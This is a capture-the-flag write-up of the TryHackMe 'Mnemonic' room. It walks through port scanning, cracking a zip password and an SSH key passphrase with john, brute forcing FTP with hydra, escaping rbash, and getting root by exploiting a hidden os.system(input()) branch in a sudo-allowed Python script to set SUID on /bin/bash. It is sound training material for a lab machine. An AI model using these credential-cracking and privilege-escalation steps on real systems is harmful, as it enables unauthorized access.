# Mnemonic

## Introduction:

Welcome to my another writeup! In this TryHackMe [Mnemonic](https://tryhackme.com/room/mnemonic) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> I hope you have fun.

> Difficulty: Medium

- Overall difficulty for me: Easy
    - Initial foothold: Easy
    - Privilege Escalation: Easy

```
Hit me!

You need 1 things : hurry up
```

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# export RHOSTS=10.10.198.208
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
1337/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

Ports Open        | Service
------------------|------------------------
21                | vsftpd 3.0.3
80                | Apache 2.4.29 (Ubuntu)
1337              | OpenSSH 7.6p1 Ubuntu

## FTP on Port 21

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# ftp $RHOSTS
Connected to 10.10.198.208.
220 (vsFTPd 3.0.3)
Name (10.10.198.208:nam): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
```

No `anonymous` login. Leave it for now.

## HTTP on Port 80

**http://10.10.198.208/:**
```html
<h1>Test</h1>
```

Nothing in `index.html`.

How about `robots.txt`?

**http://10.10.198.208/robots.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# curl http://$RHOSTS/robots.txt        
User-agent: *
Allow: / 
Disallow: /webmasters/*
```

Found `/webmasters/` directory.

Let's enumerate hidden directory via `feroxbuster`!

**Feroxbuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# feroxbuster -u http://$RHOSTS/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,txt,bak,html -o ferox.txt
[...]
[####################] - 51s    23070/23070   447/s   http://10.10.198.208/ 
[####################] - 1m     23070/23070   279/s   http://10.10.198.208/webmasters 
[####################] - 1m     23070/23070   275/s   http://10.10.198.208/webmasters/admin 
[####################] - 1m     23070/23070   283/s   http://10.10.198.208/webmasters/backups 
```

The `/webmasters/backups` looks interesting... Let's use `gobuster` to find hidden file!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# gobuster dir -u http://$RHOSTS/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,txt,bak,zip,7zip 
[...]
/backups.zip          (Status: 200) [Size: 409]
```

Found `backups.zip` file! Let's `wget` that:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# wget http://$RHOSTS/webmasters/backups/backups.zip

┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# file backups.zip        
backups.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

**Unzip it:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# unzip backups.zip 
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
   skipping: backups/note.txt        incorrect password
```

Opps. It needs a password. We can crack that via `zip2john` and `john`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# zip2john backups.zip > backups.hash
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt backups.hash 
[...]
{Redacted}         (backups.zip/backups/note.txt)
```

Found it!

**Unzip it again!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# unzip backups.zip
Archive:  backups.zip
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt        
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# cat backups/note.txt 
@vill

James new ftp username: ftpuser
we have to work hard
```

Found **FTP user name: `ftpuser`**. And maybe **`james` is the SSH username**??

But we don't know his password... Maybe we can use `hydra` to brute force it??

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://$RHOSTS -t 64
[...]
[21][ftp] host: 10.10.198.208   login: ftpuser   password: {Redacted}
```

Successfully brute forced!

# Initial Foothold

We now can login into the FTP port:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# ftp $RHOSTS
Connected to 10.10.198.208.
220 (vsFTPd 3.0.3)
Name (10.10.198.208:nam): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
[...]

ftp> ls -lah
[...]
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
```

Hmm... Let's recursively download all files in FTP via `wget`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# wget -r ftp://ftpuser:{Redacted}@$RHOSTS
```

```                                                                                                        
┌──(root🌸siunam)-[~/…/thm/ctf/Mnemonic/10.10.198.208]
└─# ls -lah        
total 60K
drwxr-xr-x 12 root root 4.0K Sep 10 03:41 .
drwxr-xr-x  5 root root 4.0K Sep 10 03:40 ..
-rw-r--r--  1 root root  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 root root 3.7K Jul 13  2020 .bashrc
drwxr-xr-x  2 root root 4.0K Sep 10 03:40 data-1
drwxr-xr-x  2 root root 4.0K Sep 10 03:40 data-10
drwxr-xr-x  2 root root 4.0K Sep 10 03:40 data-2
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-3
drwxr-xr-x  4 root root 4.0K Sep 10 03:41 data-4
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-5
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-6
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-7
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-8
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 data-9
-rw-r--r--  1 root root  807 Jul 13  2020 .profile
```

```
┌──(root🌸siunam)-[~/…/thm/ctf/Mnemonic/10.10.198.208]
└─# ls -lah data-* 
[...]
data-4:
total 24K
drwxr-xr-x  4 root root 4.0K Sep 10 03:41 .
drwxr-xr-x 12 root root 4.0K Sep 10 03:41 ..
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 3
drwxr-xr-x  2 root root 4.0K Sep 10 03:41 4
-rw-r--r--  1 root root 1.8K Jul 13  2020 id_rsa
-rw-r--r--  1 root root   31 Jul 13  2020 not.txt
```

In the `data-4` directory, we found a **SSH private key** and `not.txt` text file.

```
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# cat not.txt 
james change ftp user password
```

```
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
[...]
```

Since we knew one of the SSH usernames is `james`, so we can use this private SSH key to login as him.

```
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# chmod 600 id_rsa        
                                                                                                                    
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# ssh -i id_rsa james@$RHOSTS -p 1337
Enter passphrase for key 'id_rsa': 
james@10.10.198.208's password: 
```

Again, we also need to crack the private key's **passphrase** via `ssh2john` and `john`:

```
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# ssh2john id_rsa > james_id_rsa.hash 
                                                                                                                    
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt james_id_rsa.hash         
[...]
{Redacted}         (id_rsa)     
```

Next, let's use the private key to login as `james`!

```
┌──(root🌸siunam)-[~/…/ctf/Mnemonic/10.10.198.208/data-4]
└─# ssh -i id_rsa james@$RHOSTS -p 1337
Enter passphrase for key 'id_rsa': 
james@10.10.198.208's password: 
[...]
james@mnemonic:~$ whoami;hostname;id;ip a
james
mnemonic
uid=1001(james) gid=1001(james) groups=1001(james)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:67:45:4c:06:db brd ff:ff:ff:ff:ff:ff
    inet 10.10.198.208/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1880sec preferred_lft 1880sec
    inet6 fe80::67:45ff:fe4c:6db/64 scope link 
       valid_lft forever preferred_lft forever
Broadcast message from root@mnemonic (somewhere) (Sat Sep 10 07:47:58 2022):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.
```

We're `james`!

However, we're inside a restricted bash shell, or `rbash`.

```
james@mnemonic:~$ cd ..
-rbash: cd: restricted

james@mnemonic:~$ which $SHELL
/bin/rbash
```

To escape `rbash`, we can spawn a `pty` shell via `python3`:

```
james@mnemonic:~$ python3 -c "import pty;pty.spawn('/bin/bash')"

james@mnemonic:~$ cd ..

james@mnemonic:/home$ 
```

# Privilege Escalation

## james to condor

In `james` home directory, there are 2 files:

```
james@mnemonic:~$ ls
6450.txt  noteforjames.txt
```

**noteforjames.txt:**
```
@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
```

**6450.txt:**
```
5140656
354528
842004
1617534
465318
[...]
```

Not sure what's that, let's move on.

In the `/home` directory, I found that **user `condor`'s home directory** has a weird permission, which is **world-readable**.

```
james@mnemonic:/home$ ls -lah
[...]
drwxr--r--  6 condor  condor  4.0K Jul 14  2020 condor
[...]

james@mnemonic:/home$ cd condor/
bash: cd: condor/: Permission denied
```

Although I can't `cd` into `condor` home directory, I can **read** stuff inside it via wildcard(`*`)!

```
james@mnemonic:/home$ cat condor/*
cat: 'condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
cat: 'condor/'\''VEhNe2E1Z{Redacted}cxYzAxfQ=='\''': Permission denied
```

As you can see, there is a **padding (`=`)** in the `cat` output, which is in `base64` encoding. Let's `base64` decode it!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg                                                                                                                         
```

**user.txt:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# echo "VEhNe2E1Z{Redacted}cxYzAxfQ==" | base64 -d                    
THM{Redecated}
```

**https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg:**

![](https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg)

It's an image... Think back what we've found, the `noteforjames.txt` said:

```
james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
```

Maybe that image has something hidden? Let's `wget` that image first:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# wget https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
```

After I googled about "mnemonic encryption", I found a [GitHub repository](https://github.com/MustafaTanguner/Mnemonic) talking about mnemonic cryptography.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Mnemonic/images/a1.png)

Even the logo is 100% identical to this room's logo!

Let's **clone** this repository and install required python modules!

```
┌──(root🌸siunam)-[/opt]
└─# git clone https://github.com/MustafaTanguner/Mnemonic.git

┌──(root🌸siunam)-[/opt]
└─# pip3 install colored && pip3 install opencv-python
```

Next, let's run the `Mnemonic.py`!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# python3 /opt/Mnemonic/Mnemonic.py   
[...]
Access Code image file Path:/root/ctf/thm/ctf/Mnemonic/maxresdefault.jpg
File exists and is readable

Processing:0.txt'dir.

*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[1804052473695455217124029063427591076485887232167160486282956460768481...]

(1) ENCRYPT (2) DECRYPT
```

Then, we can decrypt it via the `6450.txt`!

```
>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:/root/ctf/thm/ctf/Mnemonic/6540.txt

{Redacted}
```

We found `condor`'s password!

**Let's SSH into `condor`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Mnemonic]
└─# ssh condor@$RHOSTS -p 1337
condor@10.10.198.208's password: 
[...]
condor@mnemonic:~$ whoami;hostname;id;ip a
condor
mnemonic
uid=1002(condor) gid=1002(condor) groups=1002(condor)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:67:45:4c:06:db brd ff:ff:ff:ff:ff:ff
    inet 10.10.198.208/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3394sec preferred_lft 3394sec
    inet6 fe80::67:45ff:fe4c:6db/64 scope link 
       valid_lft forever preferred_lft forever

condor@mnemonic:~$ which $SHELL
/bin/bash
```

## condor to root

**Sudo permission:**
```
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

User `condor` can run `python3 /bin/examplecode.py` as root!

```
condor@mnemonic:~$ ls -lah /bin/examplecode.py 
-rw-r--r-- 1 root root 2.3K Jul 15  2020 /bin/examplecode.py
```

**/bin/examplecode.py:**
```py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print
	print("""

	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()

def main():
	info()
	while True:
		select = int(input("\nSelect:"))
		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)
		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)
		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)
		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)
		if select == 0: 
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))
			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()     
		if select == 5: #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)
		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)
		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)
def info(): #info print function
	print("""

	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	""")

def run(): # run function 
	text()

run()
```

Let's break it down:

- Option1:

Run `ip a` command, which shows network connections

- Option2:

Run `ifconfig` command, which shows network interfaces

- Option3:

Run `ip route show` command, which shows all the routes

- Option4:

Run `cat /etc/os-release` command, which shows the kernel version

- Option5:

Run `shutdown now` command, which shutdown the machine, NOT spawning a root shell

- Option6:

Run `date` command, which shows the current date

- Option7:

Run `rm -r /tmp/*` command, which deletes everything in the machine

If you smart enough, you'll find that the **option 0 is kinda weird**...

```py
if select == 0: 
	time.sleep(1)
	ex = str(input("are you sure you want to quit ? yes : "))
	if ex == ".":
		print(os.system(input("\nRunning....")))
	if ex == "yes " or "y":
	   sys.exit()    
```

If we run the **option 0**, it'll prompt me to input: "Want to quit?". If I type `yes` or `y`, It'll exit normally.

BUT, **the first nested if statement** stood out:

**If I type `.`, it'll NOT exit**, instead, I'll be prompt to **run any command** (`os.system()`).

So, what if I **run the option 0, type `.`, and add SUID sticky bit into `/bin/bash`?**

```
condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py 
[...]
Select:0
are you sure you want to quit ? yes : .

Running....chmod +s /bin/bash
0

condor@mnemonic:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
```

Boom!! the `/bin/bash` has SUID sticky bit!! Let's spawn a SUID privilege bash shell!

```
condor@mnemonic:~$ /bin/bash -p

bash-4.4# whoami;hostname;id;ip a
root
mnemonic
uid=1002(condor) gid=1002(condor) euid=0(root) egid=0(root) groups=0(root),1002(condor)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:dc:66:fa:04:11 brd ff:ff:ff:ff:ff:ff
    inet 10.10.173.174/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3079sec preferred_lft 3079sec
    inet6 fe80::dc:66ff:fefa:411/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

# Rooted

**root.txt:**
```
bash-4.4# cat /root/root.txt
THM{Redacted}
```

> Note: In order to get the real flag, you have to MD5 hash the value inside {}.

# Conclusion

What we've learned:

1. Directory Enumeration
2. Cracking Password In a Zip File
3. FTP Enumeration
4. Cracking Private SSH Key's Passphrase
5. Escaping RBash
6. Privilege Escalation via Misconfigured Home Directory & Mnemonic Image Decryption
7. Privilege Escalation via Poorly Written Python Script